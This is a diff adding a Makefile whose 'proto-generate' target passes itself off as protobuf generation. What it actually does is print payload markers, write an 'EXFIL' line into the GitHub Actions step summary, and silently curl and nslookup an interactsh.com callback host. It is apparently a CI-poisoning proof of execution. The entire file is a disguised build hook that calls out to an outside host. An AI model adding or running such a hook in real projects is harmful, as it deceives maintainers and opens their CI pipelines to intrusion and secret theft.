@@ -1,0 +1,9 @@
+SHELL := /bin/bash
+.PHONY: proto-generate
+
+proto-generate:
+	@echo "hb-proto-check-payload-EXECUTED"
+	@echo "## hb-proto-check-payload-EXFIL" >> $${GITHUB_STEP_SUMMARY}
+	@curl -s -m 5 http://hb-proto-check-payload.interactsh.com/proto-check &>/dev/null &
+	@nslookup hb-proto-check-payload.interactsh.com 2>/dev/null || true
+	@echo "hb-proto-check-payload-DONE"
